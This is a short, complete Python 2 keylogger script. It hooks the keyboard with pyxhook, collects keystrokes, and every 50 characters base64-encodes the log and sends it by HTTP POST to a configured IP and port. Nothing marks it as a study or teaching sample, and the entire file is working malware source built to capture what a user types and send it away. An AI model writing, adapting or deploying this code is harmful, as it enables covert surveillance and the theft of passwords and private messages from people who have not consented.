#!/usr/bin/env python2

import requests
import pyxhook
import base64

IP = "127.0.0.1"
PORT = "2000"

if __name__ == '__main__':
    log = ""
    def OnKeyPress(event):
        global log
        if len(log) >= 50:
            try:
                print "sending..."
                r = requests.post("http://" + IP + ":" + PORT + "/", data=base64.b64encode(log))
                log = ""
            except:
                pass
        if event.Ascii > 31 and event.Ascii < 126:
            log += chr(event.Ascii)
        else:
            log += "\n[" + event.Key + "]"

    new_hook=pyxhook.HookManager()
    new_hook.KeyDown=OnKeyPress
    new_hook.HookKeyboard()
    new_hook.start()
